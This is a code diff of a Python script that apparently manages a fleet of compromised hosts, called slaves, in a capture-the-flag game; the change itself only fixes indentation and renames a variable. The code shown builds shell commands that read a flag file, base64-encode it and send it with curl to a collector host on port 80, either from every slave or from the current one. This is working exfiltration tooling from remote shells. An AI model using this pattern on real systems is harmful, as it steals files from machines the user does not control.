@@ -345,25 +345,25 @@ def main():
             if not found:
                 Log.error("Please check your input node hash!")
                 Log.error("Position is not changed!")
-            elif command == "setl":
-                EXEC_LOCAL = True
-            elif command == "setr":
-                EXEC_LOCAL = False
-            elif command == "fag":
-                flag_path = raw_input(
-                    "Input flag path (/flag.txt) : ") or ("/flag.txt")
+        elif command == "setl":
+            EXEC_LOCAL = True
+        elif command == "setr":
+            EXEC_LOCAL = False
+        elif command == "fag":
+            flag_path = raw_input(
+                "Input flag path (/flag.txt) : ") or ("/flag.txt")
             box_host = raw_input("Input flag box host (192.168.187.128) : ") or (
                 "192.168.187.128")
             box_port = int(raw_input("Input flag box host (80) : ") or ("80"))
             for i in slaves.keys():
                 slave = slaves[i]
-                command = "FLAG=`cat %s | base64`" % (flag_path)
-                Log.info("Command : %s" % (command))
-                result = slave.send_command(command)
-                command = "curl \"http://%s:%d/?flag=${FLAG}\"" % (
+                cmd = "FLAG=`cat %s | base64`" % (flag_path)
+                Log.info("Command : %s" % (cmd))
+                result = slave.send_command(cmd)
+                cmd = "curl \"http://%s:%d/?flag=${FLAG}\"" % (
                     box_host, box_port)
-                Log.info("Command : %s" % (command))
-                result = slave.send_command(command)
+                Log.info("Command : %s" % (cmd))
+                result = slave.send_command(cmd)
                 if result:
                     Log.info("Flag is sent to you!")
                 else:
@@ -377,13 +377,13 @@ def main():
             box_host = raw_input("Input flag box host (192.168.187.128) : ") or (
                 "192.168.187.128")
             box_port = int(raw_input("Input flag box host (80) : ") or ("80"))
-            command = "FLAG=`cat %s | base64`" % (flag_path)
-            Log.info("Command : %s" % (command))
-            result = current_slave.send_command(command)
-            command = "curl \"http://%s:%d/?flag=${FLAG}\"" % (
+            cmd = "FLAG=`cat %s | base64`" % (flag_path)
+            Log.info("Command : %s" % (cmd))
+            result = current_slave.send_command(cmd)
+            cmd = "curl \"http://%s:%d/?flag=${FLAG}\"" % (
                 box_host, box_port)
-            Log.info("Command : %s" % (command))
-            result = current_slave.send_command(command)
+            Log.info("Command : %s" % (cmd))
+            result = current_slave.send_command(cmd)
             if result:
                 Log.info("Flag is sent to you!")
             else:
